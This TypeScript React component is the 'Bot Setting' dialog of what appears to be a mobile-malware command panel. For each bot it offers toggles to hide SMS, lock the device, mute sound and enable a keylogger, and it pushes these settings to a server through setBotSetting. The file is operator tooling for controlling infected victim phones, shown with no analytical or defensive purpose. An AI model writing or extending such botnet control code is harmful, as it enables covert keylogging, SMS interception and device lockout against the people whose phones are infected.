import { Modal, Switch, Row, Col, notification } from 'antd';
import { useContext, useEffect, useRef } from 'react';
import { BotStateType, ServerResponseType } from '../../common/DataType';
import { BotContext } from './providers';
import { setBotSetting } from './services';

export default () => {
  const { state, setState } = useContext(BotContext)

  let firstUpdate = useRef(true)

  const handleOk = () => {
    setState((state: BotStateType) => {
      return {
        ...state,
        botSettingModal: false
      }
    })
  };

  const handleCancel = () => {
    setState((state: BotStateType) => {
      return {
        ...state,
        botSettingModal: false
      }
    })
  }

  useEffect(() => {
    if (firstUpdate.current) {

      firstUpdate.current = false
      return
    }

    setBotSetting(state.botId, state.botSetting.hideSms, state.botSetting.lockDevice, state.botSetting.offSound, state.botSetting.keyLogger)
      .then((res: ServerResponseType) => {
        // notification['info']({
        //   message: res.type.toUpperCase(),
        //   description: res.message
        // })
      })
  }, [state.botSetting])


  return (
    <Modal centered title="Bot Setting" visible={state.botSettingModal} onOk={handleOk} onCancel={handleCancel}>
      <Row className='mb-2'>
        <Col span={16} offset={4}>
          <label htmlFor="" className='float-left'>Hide SMS</label>
          <Switch className='float-right' checked={state.botSetting.hideSms} onChange={(v) => { setState((state: BotStateType) => ({ ...state, botSetting: { ...state.botSetting, hideSms: v } })) }} />
        </Col>
      </Row>
      <Row className='mb-2'>
        <Col span={16} offset={4}>
          <label htmlFor="" className='float-left'>Lock Device</label>
          <Switch className='float-right' checked={state.botSetting.lockDevice} onChange={(v) => { setState((state: BotStateType) => ({ ...state, botSetting: { ...state.botSetting, lockDevice: v } })) }} />
        </Col>
      </Row>
      <Row className='mb-2'>
        <Col span={16} offset={4}>
          <label htmlFor="" className='float-left'>Off Sound</label>
          <Switch className='float-right' checked={state.botSetting.offSound} onChange={(v) => { setState((state: BotStateType) => ({ ...state, botSetting: { ...state.botSetting, offSound: v } })) }} />
        </Col>
      </Row>
      <Row className='mb-2'>
        <Col span={16} offset={4}>
          <label htmlFor="" className='float-left'>Enable Key Logger</label>
          <Switch className='float-right' checked={state.botSetting.keyLogger} onChange={(v) => { setState((state: BotStateType) => ({ ...state, botSetting: { ...state.botSetting, keyLogger: v } })) }} />
        </Col>
      </Row>
    </Modal>
  )
}